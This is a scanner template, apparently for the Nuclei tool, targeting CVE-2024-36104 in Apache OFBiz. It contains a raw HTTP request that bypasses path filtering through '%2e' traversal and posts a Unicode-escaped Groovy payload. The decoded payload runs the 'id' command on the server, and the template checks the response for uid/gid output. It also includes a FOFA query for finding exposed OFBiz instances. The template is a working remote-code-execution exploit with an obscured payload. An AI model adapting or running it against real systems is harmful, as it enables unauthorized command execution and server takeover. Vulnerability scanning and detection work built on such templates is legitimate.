http:
- matchers:
  - part: body
    regex:
    - uid=\d+\(([^)]+)\) gid=\d+\(([^)]+)\)
    type: regex
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - 'POST /webtools/control/forgotPassword/%2e/%2e/ProgramExport HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    groovyProgram=\u0074\u0068\u0072\u006f\u0077\u0020\u006e\u0065\u0077\u0020\u0045\u0078\u0063\u0065\u0070\u0074\u0069\u006f\u006e\u0028\u0027\u0069\u0064\u0027\u002e\u0065\u0078\u0065\u0063\u0075\u0074\u0065\u0028\u0029\u002e\u0074\u0065\u0078\u0074\u0029\u003b

    '
id: CVE-2024-36104
info:
  author: Co5mos
  description: "Apache OFBiz 18.12.14\u4E4B\u524D\u7248\u672C\u5B58\u5728\u547D\u4EE4\
    \u6267\u884C\u6F0F\u6D1E\uFF0C\u8BE5\u6F0F\u6D1E\u6E90\u4E8Eorg.apache.ofbiz.webapp.control.ControlFilter\u7C7B\
    \u5BF9\u8DEF\u5F84\uFF08\u8BF7\u6C42URL\u4E2D\u7684\u7279\u6B8A\u5B57\u7B26\uFF08\
    \u5982 \uFF1B\u3001%2e\uFF09\u9650\u5236\u4E0D\u5F53\u5BFC\u81F4\u653B\u51FB\u8005\
    \u80FD\u591F\u7ED5\u8FC7\u540E\u53F0\u529F\u80FD\u70B9\u7684\u8FC7\u6EE4\u5668\
    \u9A8C\u8BC1\uFF0C\u5E76\u901A\u8FC7/webtools/control/ProgramExport\u63A5\u53E3\
    \u7684\u7F16\u7A0B\u5BFC\u51FA\u529F\u80FD\u6267\u884C\u4EFB\u610FGroovy\u4EE3\
    \u7801\u83B7\u53D6\u7CFB\u7EDF\u6743\u9650\u3002\n"
  metadata:
    fofa-query: app="Apache_OFBiz"
  name: Apache OFBiz Path Traversal to RCE (CVE-2024-36104)
  severity: critical
  tags: rce,lfi,apache,ofbiz,cve,cve2024
